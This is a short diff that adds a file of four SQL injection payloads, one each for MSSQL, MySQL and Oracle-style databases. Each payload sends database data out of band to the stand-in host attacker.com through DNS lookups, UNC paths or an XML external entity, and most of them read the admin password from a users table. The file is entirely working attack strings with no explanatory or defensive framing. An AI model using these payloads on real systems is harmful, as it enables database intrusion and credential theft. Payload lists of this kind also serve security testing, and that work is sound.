@@ -1,0 +1,4 @@
+'; DECLARE @q VARCHAR(8000); SELECT @q='http://'+(SELECT+password+FROM+users+WHERE+username='admin')+'.attacker.com'; EXEC('master..xp_dirtree "'+@q+'"')--
+'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin'),'.attacker.com\\a'))--
+"; SELECT * FROM INTO OUTFILE '\\\\attacker.com\\a'--
+1' AND (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users)||'.attacker.com/"> %remote;]>'),'/l') FROM dual)--
